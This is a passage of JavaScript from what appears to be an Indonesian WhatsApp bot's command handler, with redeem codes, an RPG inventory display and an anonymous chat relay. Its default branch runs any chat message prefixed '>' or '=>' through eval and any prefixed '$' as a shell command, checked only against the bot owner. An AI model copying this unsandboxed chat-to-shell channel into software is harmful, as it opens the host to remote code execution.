					if (db.redeem.maxRedeem < 1) return newReply("*Kode udah abiss cokk*")
					if (db.redeem.user.includes(m.sender)) return newReply("*Loee udah tadi ngabb!*")
					db.redeem.user.push(m.sender)
					db.redeem.maxRedeem -= 1
					db.data.users[m.sender].uang += 10000
					db.data.users[m.sender].exp += 1000
					db.data.users[m.sender].rank += 300
					db.data.users[m.sender].limit += 200
					let teks = "";
					teks += "*CONGRATULATION 🥳*\n\n";
					teks += "*Kamu mendapatkan*:\n";
					teks += "- Rp 10k balance\n";
					teks += "- 1000 EXP\n";
					teks += "- 300 Rank Points\n";
					teks += "- 200 Limit";
					newReply(teks)
					if (db.redeem.maxRedeem < 1) {
						await timeout(600000)
						delete db.redeem
					}
				} else {
					newReply("*Gak ada redeem yang di berikan 😓*")
				}
			}
			break

			case 'redeemset':
			case 'setredeem': {
				if (!isCreator) return newReply(mess.owner)
				db.redeem = db.redeem || {
					isRedeem: false,
					code: "",
					user: [],
					maxRedeem: 0
				}
				if (!args[0]) return newReply(`*Masukin Kode Redemnya!*\n\nContoh:\n${prefix + command} epep 10`)
				if (!args[1]) return newReply(`*Masukin Jumlah Tersedia!*\n\nContoh:\n${prefix + command} epep 10`)
				if (isNaN(args[1])) return newReply(`*Jumlah Harus Angka!*\n\nContoh:\n${prefix + command} epep 10`)
				db.redeem.isRedeem = true
				db.redeem.code = args[0]
				db.redeem.user = []
				db.redeem.maxRedeem = args[1]
				newReply("*Code Redeem, Berhasil Di Setting*")
			}
			break

			case 'delredeem':
			case 'redeemdel': {
				if (!isCreator) return newReply(mess.owner)
				db.redeem = db.redeem || {
					isRedeem: false,
					code: "",
					user: [],
					maxRedeem: 0
				}
				if (db.redeem.isRedeem) {
					newReply("*Redeem Code Dihapus!*")
					delete db.redeem
				} else {
					newReply("*Gak ada sesi redeem icik boss*")
				}
			}
			break

			case 'inventory':
			case 'inv':
			case 'profile':
			case 'profil': {
				let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : m.sender
				if (!db.data.users[users].rpg) return newReply(`*User Belum Join RPG*\n\nketik _.joinrpg_`)
				let nonya = await PhoneNumber('+' + users.replace('@s.whatsapp.net', '')).getNumber('international')
				let teks = "";
				teks += "*⚔️ RPG - PROFILE ⚔️*\n\n";
				teks += "*Crafting Item 🛠️*\n";
				teks += `- Kapal: ${db.data.rpg[users].kapal ? `(${db.data.rpg[m.sender].darahkapal}% HP)` : 'Nothing'}\n`;
				teks += `- Rumah: ${db.data.rpg[users].rumah} Unit\n`;
				teks += `- Kapak: ${db.data.rpg[users].kapak ? `(${db.data.rpg[m.sender].darahkapak}% HP)` : 'Nothing'}\n`;
				teks += `- Pickaxe: ${db.data.rpg[users].pickaxe ? `(${db.data.rpg[m.sender].darahpickaxe}% HP)` : 'Nothing'}\n`;
				teks += `- Baju Zirah: ${db.data.rpg[users].bzirah ? `(${db.data.rpg[m.sender].darahbzirah}% HP)` : 'Nothing'}\n`;
				teks += `- Pedang: ${db.data.rpg[users].pedang ? `(${db.data.rpg[m.sender].darahpedang}% HP)` : 'Nothing'}\n`;
				teks += `- Kain: ${db.data.rpg[users].kain} Lembar\n\n`;
				teks += "*User About 🤺*\n";
				teks += `- User Healthy: ${db.data.rpg[users].darahuser}/100\n`;
				teks += `- Keberadaan: ${db.data.rpg[users].wilayah}\n\n`;
				teks += "*Sumber Daya 🧰*\n";
				teks += `- Kayu: ${db.data.rpg[users].kayu} Batang\n`;
				teks += `- Besi: ${db.data.rpg[users].besi} Biji\n`;
				teks += `- Emas: ${db.data.rpg[users].emas} Biji\n`;
				teks += `- Perak: ${db.data.rpg[users].perak} Biji\n`;
				teks += `- Batubara: ${db.data.rpg[users].batubara} Biji\n\n`;
				teks += "*Hewan & Ternak 🐄*\n";
				teks += `- Ayam: ${db.data.rpg[users].ayam} Ekor\n`;
				teks += `- Sapi: ${db.data.rpg[users].sapi} Ekor\n`;
				teks += `- Domba: ${db.data.rpg[users].domba} Ekor\n`;
				teks += `- Ikan: ${db.data.rpg[users].ikan} Ekor`;
				await sock.sendMessage(m.chat, {
					image: imageBuffer,
					caption: teks,
					contextInfo: {
						mentionedJid: [users],
						forwardingScore: 9999,
						isForwarded: true,
						forwardedNewsletterMessageInfo: {
							newsletterJid: saluran,
							serverMessageId: null,
							newsletterName: saluranName
						},
						externalAdReply: {
							title: "RPG-GAME (Inventory)",
							body: 'looking for supplies to survival',
							thumbnailUrl: "https://telegra.ph/file/675903e8c4a42e1dd990b.jpg",
							sourceUrl: wagc,
							mediaType: 1,
							renderLargerThumbnail: true
						}
					}
				}, {
					quoted: m
				})
			}
			break

			default:
			if (budy.startsWith('=>')) {
				if (!isCreator) return m.react('🙄');
				await m.react('⏱️');
				function Return(sul) {
					sat = JSON.stringify(sul, null, 2)
					bang = util.format(sat)
					if (sat == undefined) {
						bang = util.format(sul)
					}
					m.react('✅');
					return newReply(bang)
				}
				try {
					newReply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
				} catch (e) {
					newReply(String(e))
				}
			};

			if (budy.startsWith('>')) {
				if (!isCreator) return m.react('🙄');
				try {
					await m.react('⏱️');
					let evaled = await eval(budy.slice(2))
					if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
					m.react('✅');
					await newReply(evaled)
				} catch (err) {
					await newReply(String(err))
				}
			};

			if (budy.startsWith('$')) {
				if (!isCreator) return m.react('🙄');
				await m.react('⏱️');
				exec(budy.slice(2), (err, stdout) => {
					m.react('✅');
					if (err) return newReply(err)
					if (stdout) return newReply(stdout)
				})
			};

			if (isCmd && budy.toLowerCase() != undefined) {
				if (m.chat.endsWith('broadcast')) return
				if (m.isBaileys) return
				let msgs = db.data.database
				if (!(budy.toLowerCase() in msgs)) return
				sock.copyNForward(m.chat, msgs[budy.toLowerCase()], true, {quoted: m})
			}

			if (m.chat.endsWith('@s.whatsapp.net') && !isCmd) {
				try {
					this.menfes = this.menfes || {};
					let room = Object.values(this.menfes).find(room => 
						[room.a, room.b].includes(m.sender) && room.state === 'CHATTING'
					);
					if (room) {
						if (/^.*(next|leave|start)/.test(m.text)) return;
						if (['.next', '.leave', '.stop', '.start', 'Cari Partner', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return;
						let find = Object.values(this.menfes).find(menpes => 
							[menpes.a, menpes.b].includes(m.sender)
						);
						let other = find.a === m.sender ? find.b : find.a;
						if (m.mtype === 'conversation' || m.mtype === 'extendedTextMessage') {
							await sock.sendMessage(other, {
								text: m.text,
								mentions: [other]
							}, { 
								quoted: fmen 
							});
						}
						if (['imageMessage', 'videoMessage', 'audioMessage', 'documentMessage', 'stickerMessage'].includes(m.mtype)) {
							let media;
							try {
								media = await m.download();
							} catch (err) {
								console.error('Gagal mengunduh media:', err);
								await sock.sendMessage(m.sender, { text: 'Gagal mengunduh media. Pastikan media masih valid dan coba lagi.' });
								return;
							}
							let options = {
								caption: m.msg?.caption || '',
								mentions: [other]
							};
							if (m.mtype === 'imageMessage') {
								await sock.sendMessage(other, { image: media, ...options });
							} 
							else if (m.mtype === 'videoMessage') {
								await sock.sendMessage(other, { video: media, ...options });
							} 
							else if (m.mtype === 'audioMessage') {
								await sock.sendMessage(other, { audio: media, mimetype: 'audio/mpeg', ...options });
							} 
							else if (m.mtype === 'documentMessage') {
								await sock.sendMessage(other, { document: media, mimetype: m.msg?.mimetype, fileName: m.msg?.fileName, ...options });
							} 
							else if (m.mtype === 'stickerMessage') {
								await sock.sendMessage(other, { sticker: media });
							} 
							else {
								console.warn('Tipe media tidak dikenali:', m.mtype);
							}
						}
					}
				} catch (err) {
					console.error('Error di fitur Menfess:', err);
					await sock.sendMessage(m.sender, { text: 'Terjadi kesalahan saat mengirim pesan ke pasangan Menfess. Silakan coba lagi nanti.' });
				}
			}
		}
	} catch (err) {
		console.log(chalk.yellow.bold("[ ERROR ] case.js :\n") + chalk.redBright(util.format(err)));
	}
};

let file = require.resolve(__filename);
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
});
